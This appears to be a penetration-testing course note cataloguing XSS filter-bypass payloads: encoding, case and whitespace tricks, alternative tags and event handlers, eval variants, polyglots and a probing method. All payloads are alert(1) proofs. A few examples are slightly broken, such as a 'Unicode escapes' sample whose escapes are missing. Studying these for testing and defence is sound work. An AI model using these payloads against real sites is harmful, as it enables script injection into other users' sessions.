---
tags: [vapt, xss, advanced]
difficulty: advanced
module: "07 - XSS"
topic: "07.14 XSS Filter Bypass Techniques"
---

# 07.14 — XSS Filter Bypass Techniques

## Why Filters Fail

Most XSS filters work by blacklisting specific strings (`<script>`, `javascript:`, `onerror`, `alert`, etc.). Bypassing them requires understanding what the filter looks for and how browsers parse HTML differently from how filters check strings.

```
FILTER APPROACHES (and why they fail):
  1. Blacklist keyword removal:   Remove "script", "onerror", etc.
     BYPASS: Case variation, encoding, alternative events
  
  2. HTML encoding output:        Encode <, >, ", '
     BYPASS: Context-specific — if in JS context, quotes aren't needed
  
  3. Regex matching:              /(<script>)/i → look for pattern
     BYPASS: Variations that still parse as the same thing to browser
  
  4. WAF (Web Application Firewall):
     BYPASS: Encoding, chunking, HTTP-level tricks (see WAF bypass module)
```

---

## Case Variation Bypasses

```html
<!-- FILTERS OFTEN CHECK FOR LOWERCASE: -->
<script>            ← blocked
<SCRIPT>            ← bypass!
<Script>            ← bypass!
<sCrIpT>            ← bypass!

<!-- EVENT HANDLERS: -->
onerror             ← blocked
ONERROR             ← bypass!
OnErRoR             ← bypass!

<!-- JAVASCRIPT: URI: -->
javascript:         ← blocked
JAVASCRIPT:         ← bypass!
JavaScript:         ← bypass!
jaVaScRiPt:         ← bypass!
```

---

## HTML Entity Encoding

```html
<!-- FILTERS OFTEN DON'T DECODE ENTITIES: -->
<!-- Browser decodes HTML entities before event handlers execute! -->

<!-- DECIMAL ENTITIES: -->
<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<!-- &#97; = a, &#108; = l, &#101; = e, etc. → alert(1) -->

<!-- HEX ENTITIES: -->
<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<!-- &#x61; = a, &#x6c; = l → alert(1) -->

<!-- MIX ENCODED AND PLAIN: -->
<svg onload=al&#101;rt(1)>     <!-- only 'e' is encoded -->

<!-- IN HREF ATTRIBUTE (double-decoded by browser): -->
<a href="&#106;avascript:alert(1)">Click</a>
<!-- &#106; = j → javascript:alert(1) -->

<!-- UNICODE ESCAPES IN JS CONTEXT (inside script tags): -->
<script>alert(1)</script>
<!-- a = 'a' → alert(1) -->
<script>eval('alert(1)')</script>
```

---

## Whitespace and Delimiter Tricks

```html
<!-- BROWSERS ACCEPT UNUSUAL WHITESPACE BETWEEN ATTRIBUTES: -->
<img src=x onerror=alert(1)>            ← basic
<img src=x       onerror=alert(1)>      ← extra spaces
<img/src=x/onerror=alert(1)>           ← / as separator!
<img%09src=x%09onerror=alert(1)>       ← tab (%09)

<!-- NEWLINES INSIDE TAGS: -->
<img 
src=x 
onerror=alert(1)>

<!-- BETWEEN TAG NAME AND ATTRIBUTES: -->
<img
onerror=alert(1) src=x>

<!-- JAVASCRIPT: WITH WHITESPACE: -->
java	script:alert(1)    ← tab between java and script
java
script:alert(1)           ← newline between java and script

<!-- ENCODED WHITESPACE IN javascript: : -->
&#09;javascript:alert(1)  ← leading tab
&#10;javascript:alert(1)  ← leading newline
```

---

## Alternative Event Handlers

```html
<!-- WHEN onerror IS FILTERED — ALTERNATIVE EVENTS: -->

<!-- AUTO-EXECUTE (no user interaction): -->
<svg onload=alert(1)>
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- REQUIRES INTERACTION: -->
<img onmouseover=alert(1) src=x>
<div onclick=alert(1)>Click me</div>
<input onblur=alert(1) autofocus>
<form onsubmit=alert(1)>

<!-- HTML5 EVENTS (often not blocked): -->
<details open ontoggle=alert(1)>
<video ><source onerror=alert(1)>
<marquee onstart=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
```

---

## Alternative Execution Methods (No alert)

```html
<!-- WHEN alert IS FILTERED: -->
confirm(1)             ← same dialog type
prompt(1)              ← same dialog type
console.log(1)         ← no visible output
print()                ← triggers print dialog!
eval('alert(1)')       ← eval-based execution
setTimeout(alert,0)    ← deferred execution
window['alert'](1)     ← property access notation

<!-- FUNCTION CONSTRUCTION: -->
Function('alert(1)')()
new Function('alert(1)')()
[].constructor.constructor('alert(1)')()

<!-- INDIRECT EVALUATION: -->
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
<!-- alert(1) as char codes! -->

<!-- BASE64 + ATOB: -->
eval(atob('YWxlcnQoMSk='))    ← base64 of alert(1)
```

---

## Attribute Quoting Bypasses

```html
<!-- WHEN DOUBLE QUOTES ARE FILTERED/ENCODED: -->
<!-- Use single quotes: -->
<img src='x' onerror='alert(1)'>

<!-- No quotes (unquoted attributes): -->
<img src=x onerror=alert(1)>

<!-- Backticks (some browsers): -->
<img src=`x` onerror=`alert(1)`>

<!-- IN ATTRIBUTE WITH ENCODED QUOTES: -->
<input value="&quot;" onclick="alert(1)">
<!-- &#x27; = ' and &#x22; = " if HTML-decoded by browser first -->

<!-- MIXING CONTEXTS: -->
<img src=x onerror="&#97;lert(1)">  ← entity inside attribute
```

---

## Tag Name Bypasses

```html
<!-- WHEN <script> AND COMMON TAGS ARE BLOCKED: -->
<svg onload=alert(1)>
<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">XSS</maction></math>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
<isindex action="javascript:alert(1)" type=image>
<button onfocus=alert(1) autofocus>
<keygen autofocus onfocus=alert(1)>
```

---

## JavaScript String Bypasses

```javascript
// WHEN alert IS FILTERED IN JS CONTEXT:

// Split the string:
var a="ale"+"rt";  a(1);
window["al"+"ert"](1);
eval("ale"+"rt(1)");

// Bracket notation:
window["alert"](1)
this["alert"](1)
self["alert"](1)

// Reverse + reverse:
eval("trelA".split("").reverse().join(""))  // "Alert" → eval → Alert
// (case sensitive, won't work directly, but shows the pattern)

// From charcode:
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// From regex:
/alert/.source // returns "alert"

// Using constructor:
[]["fill"]["constructor"]("alert(1)")()
```

---

## Comment-Based Bypasses

```html
<!-- HTML COMMENTS TO BREAK FILTER PATTERNS: -->
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
<!-- Some filters check for <script> but comments break the match! -->

<!-- CONDITIONAL COMMENTS (IE): -->
<!--[if IE]><script>alert(1)</script><![endif]-->

<!-- NULL BYTES (some parsers stop at null): -->
<scr\0ipt>alert(1)</scr\0ipt>  ← null byte in tag name

<!-- IN JAVASCRIPT: -->
// Line comment
/* Block comment */
alert(1)//comment
```

---

## Protocol-Based Bypasses

```html
<!-- WHEN javascript: IS FILTERED: -->
<!-- Try data: URI: -->
<a href="data:text/html,<script>alert(1)</script>">Click</a>

<!-- VB SCRIPT (IE only): -->
<a href="vbscript:msgbox(1)">Click</a>

<!-- ENCODING TRICKS FOR HREF: -->
<a href="&#106;avascript:alert(1)">Click</a>       <!-- &#106; = j -->
<a href="javascript&#58;alert(1)">Click</a>        <!-- &#58; = : -->
<a href="jav&#x61;script:alert(1)">Click</a>       <!-- &#x61; = a -->
<a href="%6A%61%76%61%73%63%72%69%70%74%3Aalert(1)">Click</a>  <!-- URL-encoded -->
<a href="java&#10;script:alert(1)">Click</a>       <!-- newline in middle -->
```

---

## Polyglots (One Payload, Multiple Contexts)

```html
<!-- A POLYGLOT WORKS IN MULTIPLE CONTEXTS SIMULTANEOUSLY: -->

/* XSS polyglot — fires in HTML body, attributes, JS string contexts: */
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

/* SIMPLER POLYGLOT: */
';alert(1)//';alert(1)//";alert(1)//";alert(1)//--></SCRIPT>">'><SCRIPT>alert(1)</SCRIPT>

/* USE CASE:
   When you don't know which context input lands in,
   a polyglot tests multiple at once */
```

---

## Testing Methodology for Filter Bypass

```bash
# STEP 1: UNDERSTAND WHAT'S FILTERED
# Send basic payloads and observe:
?q=<script>alert(1)</script>  → blocked? what error?
?q=<img src=x onerror=alert(1)>  → blocked?
?q="><svg onload=alert(1)>  → blocked?

# STEP 2: FIND THE FILTER'S LOGIC
# Try partial payloads:
?q=<script>    → error? or reflected?
?q=alert       → blocked? (keyword filter)
?q=onerror     → blocked?
?q=javascript: → blocked?

# STEP 3: BYPASS SPECIFIC FILTERS
# If alert is blocked: use confirm(1) or print()
# If <script> is blocked: use <svg onload=...>
# If onerror is blocked: use onfocus with autofocus

# STEP 4: ENCODE AND CASE VARY
?q=<SVG ONLOAD=ALERT(1)>  → bypasses lowercase filter?
?q=&#60;script&#62;alert(1)&#60;/script&#62;  → entity-encoded?
```

---

## Related Notes
- [[02 - Reflected XSS]] — where filters matter most
- [[15 - CSP Bypass for XSS]] — bypassing CSP
- [[21 - XSS Payloads Comprehensive List]] — full payload collection
- [[22 - XSS Tools XSStrike dalfox]] — automated bypass testing
- [[Module 15 - WAF Bypass]] — WAF-level bypass techniques
